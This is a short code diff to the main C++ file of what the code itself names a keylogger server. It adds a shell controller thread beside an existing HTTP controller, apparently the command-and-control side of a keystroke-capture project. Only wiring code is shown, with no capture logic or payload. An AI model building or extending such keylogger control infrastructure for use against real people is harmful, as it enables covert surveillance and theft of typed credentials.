@@ -3,6 +3,7 @@
 #include "CommandCenter.h"
 #include "SpiderServer.h"
 #include "WebServer.h"
+#include "Shell.h"
 #include "Logger.hpp"
 
 static volatile bool running = true;
@@ -40,12 +41,15 @@ int main()
 
   // Create controllers here
   spider::http::WebServer httpServer(cmdCenter, running);
+  spider::shell::Shell shellControl(cmdCenter, running);
 
   // Add controllers to keylogger server
   keyloggerServer.addController(httpServer);
+  keyloggerServer.addController(shellControl);
 
   // Run controllers
   std::thread httpServerThread{[&]() { httpServer.run(); }};
+  std::thread shellThread{[&]() { shellControl.run(); }};
 
   // Run server
   keyloggerServer.run();
@@ -54,6 +58,10 @@ int main()
   if (httpServerThread.joinable())
   {
     httpServerThread.join();
+  }
+  if (shellThread.joinable())
+  {
+    shellThread.join();
   }
 
   return (ret);
